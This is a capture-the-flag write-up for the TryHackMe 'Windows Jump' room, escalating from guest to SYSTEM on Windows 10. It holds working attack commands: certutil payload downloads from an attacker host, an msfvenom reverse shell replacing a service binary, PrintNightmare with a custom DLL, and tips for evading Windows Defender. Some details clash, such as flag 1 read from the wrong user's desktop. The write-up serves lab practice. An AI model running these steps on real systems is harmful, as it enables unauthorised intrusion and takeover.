# Windows Privilege Escalation: Windows Jump

**Room:** [TryHackMe — Windows Jump](https://tryhackme.com/room/windowsjump)
**Date:** July 04, 2026
**Difficulty:** Medium
**OS:** Windows 10
**Goal:** Escalate privileges from `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`

---

## 1. Reconnaissance — Nmap Scan

```bash
nmap -sV <TARGET_IP>
```

**Key findings:**

| Port | Service |
|------|---------|
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 445/tcp | SMB |
| 3389/tcp | RDP |
| 5985/tcp | WinRM |

---

## 2. Flag 1 — guest → thmuser (SMB Enumeration)

Enumerate SMB shares as guest:

```bash
smbclient -L //<TARGET_IP> -U guest -p ""
```

Connect to the `Public` share and download the file:

```bash
smbclient //<TARGET_IP>/Public -U guest -p ""
smb: \> get welcome.txt
```

`welcome.txt` contains default credentials for `thmuser`. Connect via RDP using those credentials and read the first flag:

```cmd
type C:\Users\svcadmin\Desktop\flag1.txt
```

---

## 3. Flag 2 — thmuser → notadmin (Windows AutoLogon Registry)

Query the Winlogon registry key for saved credentials:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for plaintext credentials in the output:

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    <password>
```

Switch to `notadmin` using the recovered password:

```cmd
runas /user:notadmin cmd
```

Check current privileges and groups:

```cmd
whoami /priv
whoami /groups
```

Read the second flag:

```cmd
type C:\Users\notadmin\Desktop\flag2.txt
```

---

## 4. Flag 3 — notadmin → svcadmin (Service Binary Hijacking)

### Enumerate with WinPEAS

Download and run WinPEAS on the target:

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8080/winPEASx64.exe C:\Users\Public\wp.exe
C:\Users\Public\wp.exe
```

WinPEAS identifies a vulnerable service `THMSvc` running as `.\svcadmin`. Confirm it:

```cmd
wmic service get name,startname | findstr /i "svcadmin"
sc qc THMSvc
icacls C:\Windows\THMSVC\svc.exe
```

If `notadmin` has write access to the service binary directory, the service is vulnerable to **binary hijacking**.

### Create and Deliver Reverse Shell Payload

On the attacker machine, generate a reverse shell executable:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o /tmp/reverse.exe
```

Host the file:

```bash
cd /tmp && python3 -m http.server 8080
```

Download and replace the service binary on the target:

```cmd
certutil -urlcache -f http://<ATTACKER_IP>:8080/reverse.exe C:\Windows\THMSVC\svc.exe
```

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Start the vulnerable service:

```cmd
net start THMSvc
```

A shell is returned as `svcadmin`. Read the third flag:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

---

## 5. Flag 4 — svcadmin → SYSTEM (CVE-2021-1675 / PrintNightmare)

### Check Print Spooler Status

```cmd
sc query spooler
```

Confirm it is in `RUNNING` state.

### Create a Custom Malicious DLL

To avoid Windows Defender, compile a raw socket reverse shell DLL using `mingw-w64` on the attacker machine instead of using msfvenom shellcode:

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32
```

### Deliver the Exploit

Download `SharpPrintNightmare` onto the target:

```powershell
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8080/spn.exe', 'C:\Windows\Temp\spn.exe')
```

On the attacker machine, serve the DLL via SMB:

```bash
impacket-smbserver share . -smb2support
```

Start a listener:

```bash
nc -lvnp 8080
```

Run the exploit on the target, pointing it to the DLL on the SMB share:

```powershell
C:\Windows\Temp\spn.exe \\<ATTACKER_IP>\share\evil.dll
```

A SYSTEM shell is returned. Read the final flag:

```cmd
type C:\flag4.txt
```

---

## Attack Chain Summary

| Step | From | To | Method |
|------|------|----|--------|
| 1 | guest | thmuser | Credentials found in SMB Public share (`welcome.txt`) |
| 2 | thmuser | notadmin | Windows AutoLogon plaintext password in registry (Winlogon) |
| 3 | notadmin | svcadmin | Service Binary Hijacking (`THMSvc` → writable `svc.exe`) |
| 4 | svcadmin | SYSTEM | PrintNightmare CVE-2021-1675 via Print Spooler + custom DLL |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `smbclient` | SMB share enumeration and file retrieval |
| `reg query` | Query Windows registry for stored credentials |
| `WinPEAS` | Automated Windows privilege escalation enumeration |
| `msfvenom` | Generate reverse shell payload (.exe) |
| `mingw-w64` | Cross-compile custom DLL for Windows |
| `SharpPrintNightmare` | Exploit CVE-2021-1675 via Print Spooler |
| `impacket-smbserver` | Host SMB share to deliver DLL |
| `certutil` | Download files on Windows target |
| `nc` | Reverse shell listener |

---

## Key Takeaways

- **Public SMB shares** can expose sensitive files — always enumerate them even as a guest.
- **Windows AutoLogon** stores credentials in plaintext in the registry under `Winlogon`.
- **Weak service binary permissions** allow replacing the executable with a malicious payload.
- **PrintNightmare (CVE-2021-1675)** does not require `SeImpersonatePrivilege` — it exploits DLL loading in the Print Spooler service.
- **Custom-compiled DLLs** in plain C evade Windows Defender more effectively than msfvenom shellcode payloads.

---

*Reference: [TryHackMe Windows Jump](https://tryhackme.com/room/windowsjump) · [CVE-2021-1675 — PrintNightmare](https://github.com/calebstewart/CVE-2021-1675)*****
